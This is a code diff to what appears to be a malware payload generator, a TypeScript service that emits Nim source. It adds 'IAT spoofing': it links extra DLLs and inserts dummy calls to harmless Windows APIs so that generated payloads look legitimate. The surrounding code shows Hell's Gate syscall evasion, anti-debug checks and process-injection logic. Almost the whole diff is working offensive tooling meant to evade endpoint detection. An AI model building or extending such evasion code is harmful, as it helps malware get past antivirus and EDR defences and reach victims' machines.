@@ -13,8 +13,15 @@ export class PayloadService {
         if (config.anti_debug.length > 0 || config.syscall_evasion === 'hells_gate') {
             directives.push('{.passC: "-masm=intel".}');
         }
+        // IAT Spoofing - link DLLs
+        if (config.iat_spoofing.length > 0) {
+            const dlls = [...new Set(config.iat_spoofing.map(f => f.dll))];
+            const linkFlags = dlls.map(dll => `-l${dll}`).join(' ');
+            directives.push(`{.passL: "${linkFlags}".}`);
+        }
 
         const utilsBlock = this.generateUtilsBlock(config);
+        const iatSpoofing = config.iat_spoofing.length > 0 ? this.generateIATSpoofing(config.iat_spoofing) : "";
         const hellsGateInfra = config.syscall_evasion === 'hells_gate' ? this.generateHellsGateInfra() : "";
         const evasionProcs = this.generateEvasionProcs(config);
         const injectionProc = this.generateInjectionProc(config);
@@ -27,6 +34,8 @@ import ${imports.join(', ')}
 ${directives.join('\n')}
 
 ${utilsBlock}
+
+${iatSpoofing}
 
 ${hellsGateInfra}
 
@@ -84,6 +93,93 @@ proc fibonacci(n: int): string =
     result.add($b[j])
 `;
         }
+        return code;
+    }
+
+    private generateIATSpoofing(iatFunctions: Array<{ dll: string, function_name: string }>): string {
+        if (iatFunctions.length === 0) return "";
+
+        const functionSignatures: Record<string, string> = {
+            "GetForegroundWindow": "proc GetForegroundWindow*(): HWND {.stdcall, importc: \"GetForegroundWindow\".}",
+            "GetActiveWindow": "proc GetActiveWindow*(): HWND {.stdcall, importc: \"GetActiveWindow\".}",
+            "GetSystemMetrics": "proc GetSystemMetrics*(nIndex: int32): int32 {.stdcall, importc: \"GetSystemMetrics\".}",
+            "IsWindowVisible": "proc IsWindowVisible*(hWnd: HWND): WINBOOL {.stdcall, importc: \"IsWindowVisible\".}",
+            "MessageBoxW": "proc MessageBoxW*(hWnd: HWND, lpText, lpCaption: ptr uint16, uType: uint32): int32 {.stdcall, importc: \"MessageBoxW\".}",
+            "GetDesktopWindow": "proc GetDesktopWindow*(): HWND {.stdcall, importc: \"GetDesktopWindow\".}",
+            "FindWindowW": "proc FindWindowW*(lpClassName, lpWindowName: ptr uint16): HWND {.stdcall, importc: \"FindWindowW\".}",
+            "GetWindowTextW": "proc GetWindowTextW*(hWnd: HWND, lpString: ptr uint16, nMaxCount: int32): int32 {.stdcall, importc: \"GetWindowTextW\".}",
+            "GetTickCount": "proc GetTickCount*(): uint32 {.stdcall, importc: \"GetTickCount\".}",
+            "GetTickCount64": "proc GetTickCount64*(): uint64 {.stdcall, importc: \"GetTickCount64\".}",
+            "GetFileType": "proc GetFileType*(hFile: HANDLE): uint32 {.stdcall, importc: \"GetFileType\".}",
+            "GetFileSize": "proc GetFileSize*(hFile: HANDLE, lpFileSizeHigh: ptr uint32): uint32 {.stdcall, importc: \"GetFileSize\".}",
+            "GetCurrentProcessId": "proc GetCurrentProcessId*(): uint32 {.stdcall, importc: \"GetCurrentProcessId\".}",
+            "GetCurrentThreadId": "proc GetCurrentThreadId*(): uint32 {.stdcall, importc: \"GetCurrentThreadId\".}",
+            "GetSystemTime": "proc GetSystemTime*(lpSystemTime: ptr SYSTEMTIME): void {.stdcall, importc: \"GetSystemTime\".}",
+            "GetLocalTime": "proc GetLocalTime*(lpSystemTime: ptr SYSTEMTIME): void {.stdcall, importc: \"GetLocalTime\".}",
+            "GetComputerNameW": "proc GetComputerNameW*(lpBuffer: ptr uint16, nSize: ptr uint32): WINBOOL {.stdcall, importc: \"GetComputerNameW\".}",
+            "GetVersionExW": "proc GetVersionExW*(lpVersionInformation: ptr OSVERSIONINFOW): WINBOOL {.stdcall, importc: \"GetVersionExW\".}",
+            "RegCloseKey": "proc RegCloseKey*(hKey: HKEY): int32 {.stdcall, importc: \"RegCloseKey\".}",
+            "RegOpenKeyExW": "proc RegOpenKeyExW*(hKey: HKEY, lpSubKey: ptr uint16, ulOptions: uint32, samDesired: REGSAM, phkResult: ptr HKEY): int32 {.stdcall, importc: \"RegOpenKeyExW\".}",
+            "RegQueryValueExW": "proc RegQueryValueExW*(hKey: HKEY, lpValueName: ptr uint16, lpReserved: ptr uint32, lpType: ptr uint32, lpData: ptr byte, lpcbData: ptr uint32): int32 {.stdcall, importc: \"RegQueryValueExW\".}",
+            "SHGetFolderPathW": "proc SHGetFolderPathW*(hwnd: HWND, csidl: int32, hToken: HANDLE, dwFlags: uint32, pszPath: ptr uint16): HRESULT {.stdcall, importc: \"SHGetFolderPathW\".}",
+            "ShellExecuteW": "proc ShellExecuteW*(hwnd: HWND, lpOperation, lpFile, lpParameters, lpDirectory: ptr uint16, nShowCmd: int32): HINSTANCE {.stdcall, importc: \"ShellExecuteW\".}",
+            "WSAStartup": "proc WSAStartup*(wVersionRequired: uint16, lpWSAData: ptr WSADATA): int32 {.stdcall, importc: \"WSAStartup\".}",
+            "WSACleanup": "proc WSACleanup*(): int32 {.stdcall, importc: \"WSACleanup\".}",
+            "gethostname": "proc gethostname*(name: cstring, namelen: int32): int32 {.stdcall, importc: \"gethostname\".}",
+        };
+
+        const functionCalls: Record<string, string> = {
+            "GetForegroundWindow": "discard GetForegroundWindow()",
+            "GetActiveWindow": "discard GetActiveWindow()",
+            "GetSystemMetrics": "discard GetSystemMetrics(0)",
+            "IsWindowVisible": "discard IsWindowVisible(0)",
+            "MessageBoxW": "# MessageBoxW not called (blocking)",
+            "GetDesktopWindow": "discard GetDesktopWindow()",
+            "FindWindowW": "discard FindWindowW(nil, nil)",
+            "GetWindowTextW": "discard GetWindowTextW(0, nil, 0)",
+            "GetTickCount": "discard GetTickCount()",
+            "GetTickCount64": "discard GetTickCount64()",
+            "GetFileType": "discard GetFileType(0)",
+            "GetFileSize": "discard GetFileSize(0, nil)",
+            "GetCurrentProcessId": "discard GetCurrentProcessId()",
+            "GetCurrentThreadId": "discard GetCurrentThreadId()",
+            "GetSystemTime": "discard GetSystemTime(nil)",
+            "GetLocalTime": "discard GetLocalTime(nil)",
+            "GetComputerNameW": "discard GetComputerNameW(nil, nil)",
+            "GetVersionExW": "discard GetVersionExW(nil)",
+            "RegCloseKey": "discard RegCloseKey(0)",
+            "RegOpenKeyExW": "discard RegOpenKeyExW(0, nil, 0, 0, nil)",
+            "RegQueryValueExW": "discard RegQueryValueExW(0, nil, nil, nil, nil, nil)",
+            "SHGetFolderPathW": "discard SHGetFolderPathW(0, 0, 0, 0, nil)",
+            "ShellExecuteW": "discard ShellExecuteW(0, nil, nil, nil, nil, 0)",
+            "WSAStartup": "discard WSAStartup(0, nil)",
+            "WSACleanup": "discard WSACleanup()",
+            "gethostname": "discard gethostname(nil, 0)",
+        };
+
+        let code = `
+# ============================================================================
+# IAT Spoofing - Benign Function Declarations
+# ============================================================================
+
+`;
+        for (const func of iatFunctions) {
+            const signature = functionSignatures[func.function_name];
+            if (signature) code += signature + "\n";
+        }
+
+        code += `
+# IAT Spoofing - Function Calls (to populate IAT)
+proc populateIAT*() =
+`;
+        for (const func of iatFunctions) {
+            const call = functionCalls[func.function_name];
+            if (call) code += `    ${call}\n`;
+        }
+
+        code += `
+# ============================================================================
+`;
         return code;
     }
 
@@ -592,6 +688,13 @@ proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVO
 
     private generateMainLogic(config: PayloadRequest): string {
         let code = "";
+
+        // 0. IAT Spoofing - populate IAT with benign functions
+        if (config.iat_spoofing.length > 0) {
+            code += `
+    populateIAT()
+`;
+        }
 
         // 1. Anti-Debug Checks
         if (config.anti_debug.includes('is_debugger_present')) {
